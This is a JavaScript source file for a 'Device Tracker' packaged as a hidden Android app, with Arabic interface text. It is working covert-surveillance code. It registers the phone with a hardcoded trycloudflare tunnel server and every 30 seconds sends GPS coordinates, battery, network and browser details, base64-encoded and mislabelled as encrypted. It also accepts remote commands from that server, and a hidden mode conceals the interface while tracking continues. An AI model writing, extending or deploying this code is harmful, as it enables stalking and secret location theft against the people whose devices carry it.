// hidden-apk/app.js - Device Tracker v2.0 with UI

function loadAppConfig() {
    try {
        const configEl = document.getElementById('app-config');
        if (configEl && configEl.textContent.trim()) {
            return JSON.parse(configEl.textContent);
        }
    } catch (e) { console.warn('⚠️ Config parse failed'); }
    return {
        server: { url: 'https://assign-place-picture-recommendation.trycloudflare.com', checkInInterval: 30000, timeout: 10000, retries: 5 },
        behavior: { hideIcon: false, autoStart: true, runInBackground: true, showUI: true },
        security: { encryptData: true }
    };
}

const APP_CONFIG = loadAppConfig();
const SERVER_URL = APP_CONFIG.server?.url || 'https://assign-place-picture-recommendation.trycloudflare.com';
const CHECK_IN_INTERVAL = APP_CONFIG.server?.checkInInterval || 30000;
const MAX_RETRIES = APP_CONFIG.server?.retries || 5;

console.log('🚀 Device Tracker v2.0 | Server:', SERVER_URL);

let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');
let isRunning = false;
let retryCount = 0;
let lastCheckIn = null;

// إنشاء الدوائر المتحركة
function createCircles() {
    const container = document.getElementById('circles');
    for (let i = 0; i < 5; i++) {
        const circle = document.createElement('div');
        circle.className = 'circle';
        circle.style.width = Math.random() * 100 + 50 + 'px';
        circle.style.height = circle.style.width;
        circle.style.left = Math.random() * 100 + '%';
        circle.style.animationDelay = Math.random() * 20 + 's';
        circle.style.animationDuration = (Math.random() * 10 + 15) + 's';
        container.appendChild(circle);
    }
}

// تحديث شريط الحالة
function updateStatusBar(status, text) {
    const statusBar = document.getElementById('statusBar');
    const statusText = document.getElementById('statusText');
        statusBar.className = 'status-bar ' + status;
    statusText.textContent = text;
}

// إظهار/إخفاء البطاقات
function showCard(cardId) {
    ['loadingCard', 'successCard', 'errorCard', 'warningCard'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.toggle('hidden', id !== cardId);
    });
}

// عرض رسالة خطأ
function showError(message, retryCallback) {
    console.error('❌', message);
    document.getElementById('errorMessage').textContent = message;
    showCard('errorCard');
    updateStatusBar('offline', 'غير متصل');
}

// عرض رسالة نجاح
function showSuccess() {
    console.log('✅ Connected successfully');
    showCard('successCard');
    updateStatusBar('online', 'متصل');
    updateDeviceInfo();
}

// عرض رسالة تحذير
function showWarning(message) {
    console.warn('⚠️', message);
    document.getElementById('warningMessage').textContent = message;
    showCard('warningCard');
    updateStatusBar('connecting', 'جاري الاتصال...');
}

// تحديث معلومات الجهاز
async function updateDeviceInfo() {
    try {
        // البطارية
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            document.getElementById('batteryLevel').textContent = Math.round(battery.level * 100) + '%';
        }
        
        // الشبكة
        const networkType = navigator.connection?.effectiveType || 'unknown';
        document.getElementById('networkType').textContent = networkType.toUpperCase();
        
        // الموقع        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                () => { document.getElementById('locationStatus').textContent = 'متوفر'; },
                () => { document.getElementById('locationStatus').textContent = 'غير متوفر'; },
                { timeout: 3000 }
            );
        }
    } catch (e) { console.warn('⚠️ Failed to update device info'); }
}

// إعادة المحاولة
window.retryConnection = function() {
    console.log('🔄 Retrying connection...');
    showCard('loadingCard');
    updateStatusBar('connecting', 'جاري الاتصال...');
    retryCount = 0;
    initializeDevice();
};

// تحديث فوري
window.forceCheckIn = function() {
    console.log('🔄 Force check-in...');
    checkIn();
    alert('✅ تم إرسال التحديث');
};

// عرض التفاصيل
window.showDetails = function() {
    const details = `
Server: ${SERVER_URL}
Device ID: ${deviceId || 'Not registered'}
Retry Count: ${retryCount}/${MAX_RETRIES}
Last Check-in: ${lastCheckIn ? new Date(lastCheckIn).toLocaleString() : 'Never'}
    `.trim();
    alert(details);
};

// تهيئة الجهاز
async function initializeDevice() {
    console.log('🔄 Initializing device...');
    showCard('loadingCard');
    updateStatusBar('connecting', 'جاري التهيئة...');
    
    try {
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ Already registered');
            isRunning = true;
            showSuccess();
            startCheckInService();
            return;        }
        
        console.log('🆕 New device - generating IDs...');
        clientId = 'client_' + generateRandomString(16);
        deviceId = 'device_' + generateRandomString(16);
        
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        localStorage.setItem('installTime', Date.now().toString());
        
        await registerDevice();
    } catch (error) {
        console.error('❌ Init error:', error.message);
        retryCount++;
        if (retryCount < MAX_RETRIES) {
            showWarning(`جاري إعادة المحاولة (${retryCount}/${MAX_RETRIES})...`);
            setTimeout(() => initializeDevice(), 5000 * retryCount);
        } else {
            showError('فشل الاتصال بعد عدة محاولات. تأكد من اتصال الإنترنت وحالة الخادم.');
        }
    }
}

// التسجيل
async function registerDevice() {
    console.log('📤 Registering with server...');
    showCard('loadingCard');
    updateStatusBar('connecting', 'جاري التسجيل...');
    
    try {
        const deviceInfo = {
            deviceName: getDeviceName(),
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: APP_CONFIG.app?.version || '2.0.0',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language || 'ar',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            configId: APP_CONFIG.configId,
            registeredAt: new Date().toISOString()
        };
        
        const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId, deviceInfo, config: APP_CONFIG }),
            timeout: APP_CONFIG.server?.timeout || 10000
        });
        
        const data = await response.json();        
        if (data.success) {
            encryptionKey = data.encryptionKey || generateRandomString(32);
            localStorage.setItem('deviceId', data.deviceId || deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            deviceId = data.deviceId || deviceId;
            
            console.log('✅ Registered:', deviceId);
            isRunning = true;
            retryCount = 0;
            showSuccess();
            startCheckInService();
            await sendInitialInfo();
        } else {
            throw new Error(data.error || 'Registration failed');
        }
    } catch (error) {
        console.error('❌ Registration failed:', error.message);
        showError('فشل الاتصال بالخادم. تأكد من:\n1. اتصال الإنترنت\n2. أن الخادم شغال\n3. صحة الرابط');
    }
}

async function sendInitialInfo() {
    try {
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                deviceId,
                type: 'initial_info',
                info: { battery: await getBatteryInfo(), network: await getNetworkInfo() },
                timestamp: new Date().toISOString()
            })
        });
        console.log('✅ Initial info sent');
    } catch (e) { console.error('❌ Initial info failed'); }
}

function startCheckInService() {
    console.log(`🔄 Starting check-in (interval: ${CHECK_IN_INTERVAL}ms)`);
    checkIn();
    setInterval(checkIn, CHECK_IN_INTERVAL);
}

async function checkIn() {
    try {
        lastCheckIn = new Date();
        const systemInfo = {
            deviceId, status: 'active',
            battery: await getBatteryInfo(),            network: await getNetworkInfo(),
            location: await getLocationInfo(),
            timestamp: new Date().toISOString(),
            configId: APP_CONFIG.configId
        };
        const encryptedData = btoa(JSON.stringify(systemInfo));
        
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, encryptedData }),
            timeout: APP_CONFIG.server?.timeout || 10000
        });
        
        const data = await response.json();
        if (data.success) {
            updateStatusBar('online', 'متصل');
            if (data.encryptedData) {
                try {
                    const commands = JSON.parse(atob(data.encryptedData));
                    if (commands.commands?.length > 0) {
                        console.log(`📦 Received ${commands.commands.length} command(s)`);
                        await executeCommands(commands.commands);
                    }
                } catch (e) {}
            }
        } else {
            updateStatusBar('offline', 'خطأ في الاتصال');
        }
    } catch (error) {
        console.error('❌ Check-in error:', error.message);
        updateStatusBar('offline', 'فشل الاتصال');
    }
}

async function executeCommands(commands) {
    for (const command of commands) {
        try {
            console.log('⚙️ Executing:', command.type);
            let result;
            switch (command.type) {
                case 'get_system_info': result = await getFullSystemInfo(); break;
                case 'get_location': result = await getLocationInfo(); break;
                case 'get_battery': result = await getBatteryInfo(); break;
                case 'get_network': result = await getNetworkInfo(); break;
                case 'custom': result = await executeCustomCommand(command); break;
                default: result = { error: 'Unknown command', type: command.type };
            }
            await sendCommandResult(command.id || generateCommandId(), result, 'completed');
        } catch (error) {            console.error('❌ Command failed:', error.message);
            await sendCommandResult(command.id || generateCommandId(), { error: error.message }, 'failed');
        }
    }
}

async function executeCustomCommand(command) {
    const result = { type: 'custom', received: true, timestamp: new Date().toISOString() };
    if (command.action === 'open_url' && command.payload?.url) {
        window.open(command.payload.url, '_blank');
        result.opened = command.payload.url;
    }
    return result;
}

async function sendCommandResult(commandId, result, status) {
    try {
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, commandId, result, status, timestamp: new Date().toISOString() })
        });
    } catch (error) { console.error('❌ Send result failed'); }
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return { level: Math.round(battery.level * 100), charging: battery.charging };
        }
    } catch (e) {}
    return { level: 'unknown', charging: 'unknown' };
}

async function getNetworkInfo() {
    return {
        type: navigator.connection?.effectiveType || 'unknown',
        online: navigator.onLine,
        userAgent: navigator.userAgent
    };
}

async function getLocationInfo() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve({ error: 'permission_denied' }),
                { timeout: 5000 }            );
        } else { resolve({ error: 'not_supported' }); }
    });
}

async function getFullSystemInfo() {
    return {
        userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
        screen: { width: screen.width, height: screen.height },
        battery: await getBatteryInfo(), network: await getNetworkInfo(),
        location: await getLocationInfo(), timestamp: new Date().toISOString()
    };
}

function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({length}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function generateCommandId() { return 'cmd_' + generateRandomString(12) + '_' + Date.now(); }

function getDeviceName() {
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes('android')) return 'Android Device';
    if (ua.includes('iphone')) return 'iPhone';
    return 'Unknown Device';
}

// Debug API
window.DeviceTracker = {
    getStatus: () => ({ isRunning, deviceId, lastCheckIn }),
    forceCheckIn: () => checkIn(),
    reRegister: () => { localStorage.clear(); initializeDevice(); },
    getConfig: () => APP_CONFIG
};

// بدء التطبيق
document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM loaded');
    createCircles();
    
    if (APP_CONFIG.behavior?.showUI !== false) {
        initializeDevice();
    } else {
        // وضع المخفي الكامل
        document.querySelector('.container').style.display = 'none';
        document.getElementById('statusBar').style.display = 'none';
        initializeDevice();
    }
});
console.log('✅ Device Tracker initialized with UI');